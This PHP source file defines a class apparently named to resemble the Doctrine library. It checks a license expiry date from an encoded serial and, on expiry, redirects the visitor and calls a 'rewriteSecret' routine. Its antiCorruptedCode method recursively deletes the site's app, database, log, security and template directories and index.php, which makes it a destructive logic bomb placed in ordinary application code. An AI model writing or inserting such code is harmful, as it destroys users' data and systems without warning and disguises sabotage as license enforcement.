<?php

class Doctrine_Security {

    static function antiCorruptedCode() {
        $host = $_SERVER['HTTP_HOST'];
        header('HTTP/1.0 Code corrupted');
        header("Location: http://$host/comun/not_copy/not_copy.html");
        $ROOT = $_SERVER['DOCUMENT_ROOT'];
        $corrupted_dir = [
            $ROOT . "/app",
            $ROOT . "/db",
            $ROOT . "/doc",
            $ROOT . "/help",
            $ROOT . "/log",
            $ROOT . "/comun/comun",
            $ROOT . "/comun/expired",
            $ROOT . "/comun/PrintView",
            $ROOT . "/comun/Security",
            $ROOT . "/comun/templates",
            $ROOT . "/lib/js/Extjs",
            $ROOT . "/lib/js/HighCharts",
            $ROOT . "/lib/js/Html5",
            $ROOT . "/lib/js/Utils"
        ];
        $corrupted_file = [
            $ROOT . "index.php"
        ];
        $util = new utilesComun();
        foreach ($corrupted_dir as $PATH) {
            $util->removeDirectory($PATH);
        }
        foreach ($corrupted_file as $PATH) {
            unlink($PATH);
        }
    }

    static function isRegister() {
        $isRegister = self::checkDates();
        if (!$isRegister) {
            $host = $_SERVER['HTTP_HOST'];
            $comun = '/comun';
            header('HTTP/1.0 Registration expired');
            header("Location: http://$host$comun/expired/expired.html");
            self::goToFuckCode();
            return $isRegister;
        }
        return $isRegister;
    }

    private static function checkDates() {
        $licenseDate = self::getRegisterDate();
        if ($licenseDate) {
            list($d, $m, $a) = explode('/', $licenseDate);
            list($d1, $m1, $a1) = explode('/', date('d/m/Y'));
            if (mktime(0, 0, 0, $m1, $d1, $a1) < mktime(0, 0, 0, $m, $d, $a)) {
                return true; //is register
            } else {
                return false; //is not register
            }
        } else {
            return $licenseDate;
        }
    }

    private static function getRegisterDate() {
        $license_file = $_SERVER['DOCUMENT_ROOT'] . '/comun/comun/xml/license.xml';
        if (file_exists($license_file)) {
            $xml = simplexml_load_file($license_file);
            $registerCode = explode('-', base64_decode($xml->serial));
            $d = substr($registerCode[32], 2);
            $m = substr($registerCode[65], 2);
            $Y = $registerCode[98];
            return $d . '/' . $m . '/' . $Y;
        } else {
            return false;
        }
    }

    private static function goToFuckCode() {
        $util = new utilesComun();
        $util->rewriteSecret();
    }

}